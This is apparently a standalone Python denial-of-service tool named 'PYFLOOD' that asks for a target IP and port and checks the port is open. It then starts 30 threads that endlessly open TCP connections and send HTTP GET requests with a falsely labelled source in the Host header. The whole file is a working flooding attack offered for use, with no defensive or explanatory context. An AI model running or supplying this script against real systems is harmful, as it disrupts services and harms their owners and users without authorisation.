import socket, threading, sys, pyfiglet

print(pyfiglet.figlet_format("PYFLOOD"))
print("\t\t\t\t\tMade by: X3ion")
print("_"*60)


def dos():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        sock.connect_ex((target, port))
        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        sock.sendto(("Host: " + source + "\r\n\r\n").encode('ascii'), (target, port))
        
        sock.close()

def portScan(target): # Verifying if the given port is open or closed
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    if sock.connect_ex((target, port)):
        print("Port", port, "is closed")
        sys.exit()

    else:
        print("Port", port, "is open")


target = input("TARGET IP: ")
port = int(input("ENTER THE PORT: "))
portScan(target)
source = '182.21.20.32' # Fake ip address

print("Sending packages... ")

for i in range(30):
    thread = threading.Thread(target=dos)
    thread.start()
